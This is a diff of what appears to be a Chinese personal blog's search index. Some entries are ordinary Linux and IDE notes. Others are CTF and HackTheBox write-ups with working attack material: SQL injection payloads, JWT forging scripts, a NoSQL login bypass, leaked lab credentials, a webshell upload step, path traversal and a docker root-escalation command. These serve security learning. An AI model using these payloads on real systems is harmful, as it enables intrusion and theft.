-最重要的是，我刷到了linux steam-proton 跑三角洲的教程，我又正好是劳steam服玩家（这里记住下面要考）
-安装arch
-无他唯手熟耳，由于我有多次安装经验，第一次装在物理机上也是一次成功
-教程[1]见下方参考文献
-
-此教程[1:1]有个小坑，单系统物理机安装时需要注意分区时加上grub分区，作者写在另一个页面了
-
-安装niri
-这里跟的教程[2]，但是也没有完全跟着走，因为这里面有一些小坑
-这里推荐把依赖都装好后直接在niri配置文件~/.config/niri/config.kdl里面加上
-1spawn-at-startup "qs" "-c" "noctalia-shell"
-然后启动niri，你就能正常使用了图形化了
-再根据noctalia-shell官方教程[3]配置属于自己的桌面环境
-死因
-根据B站和油管的相关视频配置三角洲，结果第一步就卒了
-根本打不开，翻评论区才发现，三角洲ACE升级了，添加了完整性检测，替换成卡拉比丘ACE的方法失效了
-如有大佬在linux上成功启动三角洲，请务必在评论区踢我
-总结
-如果你不玩游戏或只玩原生或已被proton支持且未被反作弊追杀的游戏（如永劫无间、CS2、LOL、MC等，瓦据说CachyOS做了反反作弊，可以看看是怎么实现的，也可以直接去用CachyOS，它是一个针对游戏进行了优化的Arch分支，也很推荐）
-那么非常推荐使用ArchLinux或其分支，并推荐niri+noctalia桌面，除游戏外各方面体验已经非常好了，也比较容易上手了
-图片展示
-
-被QQ压缩了，原图是很清晰的
-
-
-    [{"url":"/img/ba4d06c205eb3ca9ade48c1f6aa60aa7_720.png","alt":"niri展示","title":""},{"url":"/img/be5cc1c6e7d41f0a25f3cd23164a191a_720.png","alt":"edge in arch","title":""},{"url":"/img/1f9df7afbd8c47eae926cf91e1d101d3_720.png","alt":"winboat (lsw wsl翻版)","title":""},{"url":"/img/49733e36b12e83e5127ace51e46862c6_720.png","alt":"三角洲你怎么这么坏.jpg","title":""}]
-  
-参考文献
-
-
-
-archlinux简明指南 ↩︎ ↩︎
-
-Niri安装与配置 ↩︎
-
-Noctalia-shell ↩︎
-
-
-
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>arch</tag>
-        <tag>wayland</tag>
-        <tag>niri</tag>
-        <tag>noctalia</tag>
-        <tag>shell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Visual Studio 2022界面美化教程</title>
-    <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[
-我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。
-这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章）
-不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。
-但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。
-第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。
-新建项目 C#里面最后一项
-
-
-创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme
-然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了
-
-这个插件是为后面设置背景图片准备
-第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。
-
-背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些
-
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>visual studio 2022</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2024 长城杯铁人三项半决赛第二赛区 wp</title>
-    <url>/2024/05/awdwp/</url>
-    <content><![CDATA[(未整理完)
-CFS
-misc1
-备份文件泄露
-下载后是流量包
-流量包存在明文 flag
-（这里可能是非预期，预期是 aes 破解到 test 密码后，有个页面有个 flag）
-
-misc2
-流量里还有一个 flag.zip
-导出后
-爆破得密码为 123456
-web
-存在 rce 查看解析目录后 echo 一句话木马进去
-连接后 cat /flag 啥啥啥.txt
-flag get
-
-AWD
-题目附件备份：
-php
-java1
-java2
-php
-hook 流量发现一个 php 路径穿越
-/frontend/ajax/getfile?file=../../../../../../flag.txt
-修复：
-将/和.等用于路径穿越的字符过滤置空
-
-java1
-一个 java
-/forget.jsp?cmd1=cat+/flag.txt
-修复 把 cmd1 字段改成复杂密码 使攻击者无法连接
-
-]]></content>
-      <categories>
-        <category>awd</category>
-      </categories>
-      <tags>
-        <tag>awd</tag>
-        <tag>长城杯</tag>
-        <tag>铁人三项</tag>
       </tags>
   </entry>
   <entry>
@@ -1970,6 +1859,111 @@ if roots:
       </tags>
   </entry>
   <entry>
+    <title>arch + niri + noctalia-shell安装记录</title>
+    <url>/2026/01/arch/</url>
+    <content><![CDATA[
+本文只是记录非教程，教程见下方参考文献
+
+仅以此文悼念出生未满一周便被安乐的Arch娘
+起因
+跟了我四年多的笔记本512G硬盘又双叒叕爆红了，又到了例行重装系统的时候了
+但是这一次我直接选择买一块硬盘，虽然是这价格涨到天际的时候，一块1T PCIE3gen4
+别问为什么是pcie3 因为是老电脑 1TB是因为没钱 请各位鸽鸽们打赏点吧
+于是打算干脆装个arch + niri + noctalia-shell
+反正网上说适配得不错了，一些软件的wayland水土不服也都有教程了
+最重要的是，我刷到了linux steam-proton 跑三角洲的教程，我又正好是劳steam服玩家（这里记住下面要考）
+安装arch
+无他唯手熟耳，由于我有多次安装经验，第一次装在物理机上也是一次成功
+教程[1]见下方参考文献
+
+此教程[1:1]有个小坑，单系统物理机安装时需要注意分区时加上grub分区，作者写在另一个页面了
+
+安装niri
+这里跟的教程[2]，但是也没有完全跟着走，因为这里面有一些小坑
+这里推荐把依赖都装好后直接在niri配置文件~/.config/niri/config.kdl里面加上
+1spawn-at-startup "qs" "-c" "noctalia-shell"
+然后启动niri，你就能正常使用了图形化了
+再根据noctalia-shell官方教程[3]配置属于自己的桌面环境
+死因
+根据B站和油管的相关视频配置三角洲，结果第一步就卒了
+根本打不开，翻评论区才发现，三角洲ACE升级了，添加了完整性检测，替换成卡拉比丘ACE的方法失效了
+如有大佬在linux上成功启动三角洲，请务必在评论区踢我
+总结
+如果你不玩游戏或只玩原生或已被proton支持且未被反作弊追杀的游戏（如永劫无间、CS2、LOL、MC等，瓦据说CachyOS做了反反作弊，可以看看是怎么实现的，也可以直接去用CachyOS，它是一个针对游戏进行了优化的Arch分支，也很推荐）
+那么非常推荐使用ArchLinux或其分支，并推荐niri+noctalia桌面，除游戏外各方面体验已经非常好了，也比较容易上手了
+图片展示
+
+被QQ压缩了，原图是很清晰的
+
+
+    [{"url":"/img/ba4d06c205eb3ca9ade48c1f6aa60aa7_720.png","alt":"niri展示","title":""},{"url":"/img/be5cc1c6e7d41f0a25f3cd23164a191a_720.png","alt":"edge in arch","title":""},{"url":"/img/1f9df7afbd8c47eae926cf91e1d101d3_720.png","alt":"winboat (lsw wsl翻版)","title":""},{"url":"/img/49733e36b12e83e5127ace51e46862c6_720.png","alt":"三角洲你怎么这么坏.jpg","title":""}]
+  
+参考文献
+
+
+
+archlinux简明指南 ↩︎ ↩︎
+
+Niri安装与配置 ↩︎
+
+Noctalia-shell ↩︎
+
+
+
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>arch</tag>
+        <tag>wayland</tag>
+        <tag>niri</tag>
+        <tag>noctalia</tag>
+        <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali安装docker</title>
+    <url>/2022/03/docker/</url>
+    <content><![CDATA[kali 安装 docker
+12345678apt-get update
+apt-get install docker-engine
+## 安装结束，打开docker服务
+service docker start
+## 验证安装，运行测试样例
+docker --version
+docker run hello-world
+#测试
+docker 常用命令
+12345docker --version
+docker images
+docker ps -a
+docker run -d --name 123 -p 127.0.0.1:80:80 镜像名
+docker stop 123
+其他常用命令见菜鸟教程
+dockers 底层原理
+Namespaces
+
+命名空间是 Linux 为我们提供的用于分离进程树、网络接口、挂载点以及进程间通信等资源的方法。在日常使用 Linux 时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。
+
+CGroups
+
+我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们提供物理资源上的隔离，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。
+如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I/O 和网络带宽。
+在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。
+
+]]></content>
+      <categories>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>kali</tag>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfhub-rce</title>
     <url>/2022/04/ctfhub-rce/</url>
     <content><![CDATA[rce：远程代码执行漏洞
@@ -2116,6 +2110,52 @@ if (isset($_GET['ip']) &#x26;&#x26; $_GET['ip']) {
       </tags>
   </entry>
   <entry>
+    <title>2024 长城杯铁人三项半决赛第二赛区 wp</title>
+    <url>/2024/05/awdwp/</url>
+    <content><![CDATA[(未整理完)
+CFS
+misc1
+备份文件泄露
+下载后是流量包
+流量包存在明文 flag
+（这里可能是非预期，预期是 aes 破解到 test 密码后，有个页面有个 flag）
+
+misc2
+流量里还有一个 flag.zip
+导出后
+爆破得密码为 123456
+web
+存在 rce 查看解析目录后 echo 一句话木马进去
+连接后 cat /flag 啥啥啥.txt
+flag get
+
+AWD
+题目附件备份：
+php
+java1
+java2
+php
+hook 流量发现一个 php 路径穿越
+/frontend/ajax/getfile?file=../../../../../../flag.txt
+修复：
+将/和.等用于路径穿越的字符过滤置空
+
+java1
+一个 java
+/forget.jsp?cmd1=cat+/flag.txt
+修复 把 cmd1 字段改成复杂密码 使攻击者无法连接
+
+]]></content>
+      <categories>
+        <category>awd</category>
+      </categories>
+      <tags>
+        <tag>awd</tag>
+        <tag>长城杯</tag>
+        <tag>铁人三项</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfshow黑盒测试</title>
     <url>/2023/01/ctfshow%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[web380
@@ -2216,43 +2256,75 @@ clear.php?file=./install/lock.dat
       </tags>
   </entry>
   <entry>
-    <title>kali安装docker</title>
-    <url>/2022/03/docker/</url>
-    <content><![CDATA[kali 安装 docker
-12345678apt-get update
-apt-get install docker-engine
-## 安装结束，打开docker服务
-service docker start
-## 验证安装，运行测试样例
-docker --version
-docker run hello-world
-#测试
-docker 常用命令
-12345docker --version
-docker images
-docker ps -a
-docker run -d --name 123 -p 127.0.0.1:80:80 镜像名
-docker stop 123
-其他常用命令见菜鸟教程
-dockers 底层原理
-Namespaces
+    <title>htb-Shoppy</title>
+    <url>/2022/10/htb-Shoppy/</url>
+    <content><![CDATA[
+共做出三道题，前两道题 wp 正在补，但现在又有点想转去做 vulntarget
 
-命名空间是 Linux 为我们提供的用于分离进程树、网络接口、挂载点以及进程间通信等资源的方法。在日常使用 Linux 时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。
+Shoppy
+信息收集
+老样子 先 nmap 扫下
+有 22 和 80
 
-CGroups
+然后将域名加入 hosts
+子域名扫描
+可以使用 gobuster 或各种 fuzz 工具如 wfuzz
 
-我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们提供物理资源上的隔离，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。
-如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I/O 和网络带宽。
-在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。
+本来想用 oneforall 扫子域名，试了半天一堆错误，后来问学长，oneforall 是调用了一堆子域名解析的
 
+扫到 mattermost.shoppy.htb 加进 hosts
+打开发现是个登陆界面，先放着
+跑下主站的域名 发现有个/admin
+登录
+根据黑盒测试老套路，试试弱口令，不成功，试试万能密码跑下
+发现admin'||''==='成功进入
+进入后发现搜索框，可进行大量尝试
+当搜索到 admin 后出现 passwordhash
+继续尝试后发现搜索admin'||''==='会出现两个 hash
+使用 hashcat 爆破
+josh:remembermethisway
+然后进入之前扫到的那个子域名尝试登陆，成功
+又是 htb 经典频道页面
+翻找后发现
+
+尝试使用 ssh 连接
+password:Sh0ppyBest@pp!
+
+user get√
+root
+ssh 进入后 ls 发现已经有老哥把经典 linepeas 传进去了
+开跑！
+然后爆出一堆 cve 先放一边
+还在后面看到一些 password 字段的文件去看看
+
+
+password:Sample
+调用下密码管理器
+
+再次使用 ssh 登录 deploy 账户
+进入后又没啥思路了
+准备走 cve 了
+走前看了眼 wp
+发现聊天页下面还有段话
+
+发现 docker 部署尝试 docker 提权
+1docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+其实后来想想 linpeas 里出现了提示
+
+deplay 在 root 权限的 docker 组里，当时要是细看的话应该也能想到
+后面跟着 wp 做 cve 也懒得去试了
+最后给师傅们留下截图
+
+这回 cve 都没用，给个简单低评吧~
 ]]></content>
       <categories>
-        <category>教程</category>
+        <category>htb</category>
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>kali</tag>
-        <tag>docker</tag>
+        <tag>htb-Shoppy</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -2335,233 +2407,8 @@ su root 获取 root.txt
       </categories>
       <tags>
         <tag>web</tag>
+        <tag>HackTheBox</tag>
         <tag>htb-Cat</tag>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git命令</title>
-    <url>/2022/02/git/</url>
-    <content><![CDATA[创建仓库命令
-init
-git init 命令用于在目录中创建新的 Git 仓库。
-在文件夹中，会被创建出一个.git 的一个隐藏文件，这时，本地库已经初始化完成.
-clone
-git clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。
-拷贝项目命令格式如下：
-1git clone [url]
-提交与修改
-add
-git add 命令可将该文件添加到暂存区。
-添加一个或多个文件到暂存区
-commit
-git commit 命令将暂存区内容添加到本地仓库中。
-提交暂存区到本地仓库中:
-1git commit -m [message]
-[message] 可以是一些备注信息。
-status
-git status 命令用于查看在你上次提交之后是否有对文件进行再次修改。
-rm
-git rm 命令用于删除文件。
-如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。
-mv
-git mv 命令用于移动或重命名一个文件、目录或软连接。
-1git mv [file] [newfile]
-如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数：
-1git mv -f [file] [newfile]
-远程操作
-remote
-显示所有远程仓库：
-1git remote -v
-pull
-git pull 命令用于从远程获取代码并合并本地的版本。
-1git pull &#x3C;远程主机名> &#x3C;远程分支名>:&#x3C;本地分支名>
-push
-git push 命用于从将本地的分支版本上传到远程并合并。
-1git push &#x3C;远程主机名> &#x3C;本地分支名>:&#x3C;远程分支名>]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfhub-jwt</title>
-    <url>/2022/09/jwt/</url>
-    <content><![CDATA[基础知识
-题目附件：jwt 基础知识
-flag 在下面
-需要了解一下 jwt 组成部分
-敏感信息泄露
-随便输个
-进去查消息头
-然后在
-jwt.io
-decode 一共两部分 ag 是另一半
-
-无签名
-12345678910import jwt
-algorithm="none"
-payload = {
-  "username": "admin",
-  "password": "admin",
-  "role":"admin"
-  }
-key = ""
-encoded = jwt.encode(payload,key,algorithm)
-print(encoded)
-jwt 的签名可以为无
-
-今天写这个脚本的时候命名为 jwt.py
-结果报错 但是系统环境运行正常
-才知道是文件名的事
-import jwt 他先自己引用自己了
-
-抓包
-把 cookie 里的 token 改为这脚本的运行结果
-弱密钥
-需要用到jwt-cracker
-依次执行即可
-1234git clone https://github.com/brendan-rius/c-jwt-cracker
-./c-jwt-cracker
-make
-./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs
-然后得出该 jwt 密钥
-然后放之前那个网站
-改 role 为 admin
-
-返回提交 token
-
-修改签名算法
-把 cookie 清空后提交用户名密码
-得到一串 jwt
-丢进
-
-发现是 RS256 编码（不对称式编码)
-需要改为对称式编码
-如 HS256
-题目中给了 public key
-用 PUBLIC_KEY 采用 HS256 进行加密 payload 构造 token
-借用大神 h0ld1rs的脚本
-
-无签名那段脚本
-是勉勉强强写出来的
-这题就先用大神的脚本吧
-我太菜了
-
-123456789101112131415161718192021222324252627## coding=GBK
-import hmac
-import hashlib
-import base64
-
-file = open('publickey.pem')#需要将文中的publickey下载	与脚本同目录
-key = file.read()
-
-## Paste your header and payload here
-header = '{"typ": "JWT", "alg": "HS256"}'
-payload = '{"username": "admin", "role": "admin"}'
-
-## Creating encoded header
-encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
-encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")
-
-## Creating encoded payload
-encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
-encodePayload = str(encodePBytes, "utf-8").rstrip("=")
-
-## Concatenating header and payload
-token = (encodeHeader + "." + encodePayload)
-
-## Creating signature
-sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"), token.encode("utf-8"), hashlib.sha256).digest()).decode("UTF-8").rstrip("=")
-
-print(token + "." + sig)
-运行后把 token 返回去验证
-成功
-
-
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>jwt</tag>
-        <tag>json web token</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>htb-Shoppy</title>
-    <url>/2022/10/htb-Shoppy/</url>
-    <content><![CDATA[
-共做出三道题，前两道题 wp 正在补，但现在又有点想转去做 vulntarget
-
-Shoppy
-信息收集
-老样子 先 nmap 扫下
-有 22 和 80
-
-然后将域名加入 hosts
-子域名扫描
-可以使用 gobuster 或各种 fuzz 工具如 wfuzz
-
-本来想用 oneforall 扫子域名，试了半天一堆错误，后来问学长，oneforall 是调用了一堆子域名解析的
-
-扫到 mattermost.shoppy.htb 加进 hosts
-打开发现是个登陆界面，先放着
-跑下主站的域名 发现有个/admin
-登录
-根据黑盒测试老套路，试试弱口令，不成功，试试万能密码跑下
-发现admin'||''==='成功进入
-进入后发现搜索框，可进行大量尝试
-当搜索到 admin 后出现 passwordhash
-继续尝试后发现搜索admin'||''==='会出现两个 hash
-使用 hashcat 爆破
-josh:remembermethisway
-然后进入之前扫到的那个子域名尝试登陆，成功
-又是 htb 经典频道页面
-翻找后发现
-
-尝试使用 ssh 连接
-password:Sh0ppyBest@pp!
-
-user get√
-root
-ssh 进入后 ls 发现已经有老哥把经典 linepeas 传进去了
-开跑！
-然后爆出一堆 cve 先放一边
-还在后面看到一些 password 字段的文件去看看
-
-
-password:Sample
-调用下密码管理器
-
-再次使用 ssh 登录 deploy 账户
-进入后又没啥思路了
-准备走 cve 了
-走前看了眼 wp
-发现聊天页下面还有段话
-
-发现 docker 部署尝试 docker 提权
-1docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-
-其实后来想想 linpeas 里出现了提示
-
-deplay 在 root 权限的 docker 组里，当时要是细看的话应该也能想到
-后面跟着 wp 做 cve 也懒得去试了
-最后给师傅们留下截图
-
-这回 cve 都没用，给个简单低评吧~
-]]></content>
-      <categories>
-        <category>htb</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>HackTheBox</tag>
-        <tag>htb-Shoppy</tag>
       </tags>
   </entry>
   <entry>
@@ -2618,764 +2465,51 @@ Code
       </tags>
   </entry>
   <entry>
-    <title>linux动态加载</title>
-    <url>/2022/05/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
-    <content><![CDATA[linux 动态加载
-查看环境
-先给了 755
-他自己传了 flag 等于告诉我们在哪了
-然后限到了 644
-不想让我们直接看
-
-都到这一题了权限应该不用讲了
-
-提示给了 shell
-且不需要提权
-
-于是需要新学一个东西
-动态加载
-Linux ELF Dynaamic Loader
-elf 文件
-elf 文件是 linux 下的可执行文件
-文件头为 elf
-
-不知道是靶机还是蚁剑虚拟终端的问题 没法 vi
-直接 cat 就能看到了
-
-
-动态库链接器/加载器
-
-当需要动态链接的应用被操作系统加载时
-系统必须要定位然后加载它所需要的所有动态库文件
-在 Linux 环境下，这项工作是由 ld-linux.so.2 来负责完成的
-执行操作时操作系统会将控制权交给 ld-linux.so
-而不是交给程序正常的进入地址
-ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。
-
-ldd 命令
-使用 ldd 命令即可查看
-简便的 shell 命令依赖哪些动态加载库
-
-姿势
-在 cat elf 文件时
-看到第一行后面/lib64/ld-linux-x86-64.so.2 动态库
-并且在 ldd
-可以看到 ls 和 cat 动用他了
-用！
-这是他的介绍
-执行
-1/lib64/ld-linux-x86-64.so.2 /readflag
-get
-]]></content>
+    <title>git命令</title>
+    <url>/2022/02/git/</url>
+    <content><![CDATA[创建仓库命令
+init
+git init 命令用于在目录中创建新的 Git 仓库。
+在文件夹中，会被创建出一个.git 的一个隐藏文件，这时，本地库已经初始化完成.
+clone
+git clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。
+拷贝项目命令格式如下：
+1git clone [url]
+提交与修改
+add
+git add 命令可将该文件添加到暂存区。
+添加一个或多个文件到暂存区
+commit
+git commit 命令将暂存区内容添加到本地仓库中。
+提交暂存区到本地仓库中:
+1git commit -m [message]
+[message] 可以是一些备注信息。
+status
+git status 命令用于查看在你上次提交之后是否有对文件进行再次修改。
+rm
+git rm 命令用于删除文件。
+如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。
+mv
+git mv 命令用于移动或重命名一个文件、目录或软连接。
+1git mv [file] [newfile]
+如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数：
+1git mv -f [file] [newfile]
+远程操作
+remote
+显示所有远程仓库：
+1git remote -v
+pull
+git pull 命令用于从远程获取代码并合并本地的版本。
+1git pull &#x3C;远程主机名> &#x3C;远程分支名>:&#x3C;本地分支名>
+push
+git push 命用于从将本地的分支版本上传到远程并合并。
+1git push &#x3C;远程主机名> &#x3C;本地分支名>:&#x3C;远程分支名>]]></content>
       <categories>
         <category>web</category>
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>ctfhub</tag>
-        <tag>linux</tag>
-        <tag>动态加载</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-lab</title>
-    <url>/2022/02/sqli-lab/</url>
-    <content><![CDATA[sql 注入就是
-当用户输入一些本不是用户名密码的 sql 语句
-这些语句没有被过滤
-执行后通过回显等方式，使注入者获得了数据库的信息
-
-水了几天用来搞 visual studio2022 和 Windows11 所以本文略微简陋写，以后会完善
-visual studio2022 版美化教程见Visual Studio 2022 界面美化教程.
-
-GET 传参
-先放代码
-1234567891011121314151617181920212223242526272829303132333435363738394041424344&#x3C;?php
-//including the Mysql connect parameters.
-include("../sql-connections/sql-connect.php");
-error_reporting(0);
-// take the variables
-if(isset($_GET['id']))
-{
-$id=$_GET['id'];
-//logging the connection parameters to a file for analysis.
-$fp=fopen('result.txt','a');
-fwrite($fp,'ID:'.$id."\n");
-fclose($fp);
-// connectivity
-//注意get传参
-获取到输入的id后先打开一个result.txt然后把你上传的写入到那个文件里
-这样你再一次操作后你就可以看到你的注入语句真正注进去的是啥了
-$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
-//上面一行中$id前后的符号是关键，是注入语句闭合的符号
-$result=mysql_query($sql);
-$row = mysql_fetch_array($result);
-
-	if($row)
-	{
-	  	echo "&#x3C;font size='5' color= '#99FF00'>";//正确回显颜色为绿色
-	  	echo 'Your Login name:'. $row['username'];
-	  	echo "&#x3C;br>";
-	  	echo 'Your Password:' .$row['password'];
-	  	echo "&#x3C;/font>";
-  	}
-  	//这是输入正确时的反馈，直接把运行结果告诉你
-    但是后几关就不一样了
-	else
-	{
-		echo '&#x3C;font color= "#FFFF00">';//报错回显为黄色
-		print_r(mysql_error());
-		echo "&#x3C;/font>";
-	}
-	//这是输入错误时的反馈，把mysql_error反馈给你
-    同样，后几关也不一样了
-}
-	else { echo "Please input the ID as parameter with numeric value";}
-//这是反馈你输入为空的
-
-?>
-/* *我为了让读者能看得更清晰，我将注释符的右半部分删去，就像这句一样没有* */（你细品这句话 悖论）
-我第一个注释是：注意 get 传参，前 10 关前半部分代码不变
-第二个注释是提示读者要注意每一关的闭合方式（包裹方式）
-在 if 后 else 前是正确回显部分 在 else 后是错误回显部分
-这两部分是区分注入方式所需要关注的
-先讲理论
-根据两部分分别是否回显判断注入方式
-注入方式包含联合查询、布尔盲注、时间盲注、报错注入等
-传参
-最基础的就是?id=1’、username=admin’这类传参语句，后面的’引号是闭合方式上面有讲，他用的啥符号闭合，你就要用相同的符号来闭合你的语句，输入这类最基础的注入语句来判断是否有报错回显 回显是黄色，代码段注释里有写
-判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数
-1?id=1’ order by 1--+
-这里的省略号只要不报错 就加大数字，直到报错的前一个数字，就是回显的行数
-判断回显的数据是数据库中的哪几列
-1?id=-1’ union select 1,2,3--+
-这里的数字的最大值要等与上一步得到的那个数
-上一步 7 报错，那行数就是 6，这一步就要 1，2，3，4，5，6–+
-看看那几个数字出现在你屏幕上了
-要注意要 id=一个不正确的值 如 0，-1 之类 这样联合查询之后的返回值会让 union 之后的查询语句的结果在数组的第一列，而后台 php 代码只会回显第一列的数据
-查库名
-1?id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata --+
-这里把查数据库的 sql 语句，替换掉出现在你屏幕上的一个数字 这里是 3 来回显在屏幕上
-group_concat(你要查询的数据）from 所在的库 表 列
-这里查库名即查schema_name 这个数据被保存在information_schema.schemata
-这样 回显的就是 数据库们 的名字
-查表名
-1?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’–+
-table 表 information_schema.tables 类比上面 table_schema=‘ 库名’
-这里你要猜一下哪个数据库会放着你想要的数据，然后输在库名那个位置
-查列名
-1?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’--+
-同样类比上面 column 列
-这里还要猜 上面回显的哪个表里有你要的数据
-提取数据
-激动人心的时候到了
-1?id=-1’ union select 1,2,group_concat(concat_ws(’~’,username,password)) from users–+
-同样类比上面 有一处特殊 concat_ws(符号，列名，列名）
-中间那个符号会被 concat_ws 插入到两组数据之间，就是为了方便看
-这样就查到数据了，是不是很简单。
-limit
-limit 是限制那一部分显示，limitx，y 是从 x+1 开始显示 y 个
-实操
-正错回显都有
-就按上面的步骤一步一步找到数据
-security———&gt;users——&gt;username&amp;password 这就是靶场数据库的层次
-图啥的以后再补
-理论进阶
-时间盲注
-12?id=1’ and sleep (5)–+
-?id=1‘ and if((left((select schema_name from information_schema.schemata limit 4,1),1,1)=‘s’),1,sleep(3))–+
-这样的句子 sleep()就是延时执行的意思，
-
-让浏览器先睡一会
-当你想判断对不对的时候，你就让对的睡一会，错的继续肝，这样你就能看出来了
-
-布尔盲注
-下面几个方法各有优缺点
-因为能知道 sql-lab 靶场数据库的数据
-所以刷题时我多用 left
-实际
-substr
-substr(a,b,c)将 a 字段从第 b 个字符读取 c 个字符
-ascii
-将括号中的字符转换为 acsii 码，再在最后进行值大小的判断，正确返回 1，错误返回 0
-
-类似于数学中的二分法
-left
-left(a)从第一位开始读取 a 个字符
-
-模糊查询 like
-a like ‘%b%’ 判断 a 字符串里是否有 b
-a like ‘b%’ 判断 a 开头是否有 b 数
-regexp
-regexp ‘a’正则表达式
-
